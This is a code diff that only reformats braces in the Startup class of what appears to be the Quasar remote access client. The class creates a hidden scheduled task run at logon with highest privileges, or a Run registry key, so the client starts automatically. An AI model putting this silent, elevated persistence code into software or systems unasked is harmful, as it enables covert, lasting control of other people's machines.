@@ -5,18 +5,12 @@ using Quasar.Client.Config;
 using Quasar.Client.Data;
 using Quasar.Client.Helper;
 
-namespace Quasar.Client.Installation
-{
-    public static class Startup
-    {
-        public static bool AddToStartup()
-        {
-            if (WindowsAccountHelper.GetAccountType() == "Admin")
-            {
-                try
-                {
-                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                    {
+namespace Quasar.Client.Installation {
+    public static class Startup {
+        public static bool AddToStartup() {
+            if (WindowsAccountHelper.GetAccountType() == "Admin") {
+                try {
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks") {
                         Arguments = "/create /tn \"" + Settings.STARTUPKEY + "\" /sc ONLOGON /tr \"" + ClientData.CurrentPath + "\" /rl HIGHEST /f",
                         UseShellExecute = false,
                         CreateNoWindow = true
@@ -25,31 +19,23 @@ namespace Quasar.Client.Installation
                     Process p = Process.Start(startInfo);
                     p.WaitForExit(1000);
                     if (p.ExitCode == 0) return true;
-                }
-                catch (Exception)
-                {
+                } catch (Exception) {
                 }
 
                 return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                     true);
-            }
-            else
-            {
+            } else {
                 return RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY, ClientData.CurrentPath,
                     true);
             }
         }
 
-        public static bool RemoveFromStartup()
-        {
-            if (WindowsAccountHelper.GetAccountType() == "Admin")
-            {
-                try
-                {
-                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
-                    {
+        public static bool RemoveFromStartup() {
+            if (WindowsAccountHelper.GetAccountType() == "Admin") {
+                try {
+                    ProcessStartInfo startInfo = new ProcessStartInfo("schtasks") {
                         Arguments = "/delete /tn \"" + Settings.STARTUPKEY + "\" /f",
                         UseShellExecute = false,
                         CreateNoWindow = true
@@ -58,16 +44,12 @@ namespace Quasar.Client.Installation
                     Process p = Process.Start(startInfo);
                     p.WaitForExit(1000);
                     if (p.ExitCode == 0) return true;
-                }
-                catch (Exception)
-                {
+                } catch (Exception) {
                 }
 
                 return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
-            }
-            else
-            {
+            } else {
                 return RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
                     "Software\\Microsoft\\Windows\\CurrentVersion\\Run", Settings.STARTUPKEY);
             }
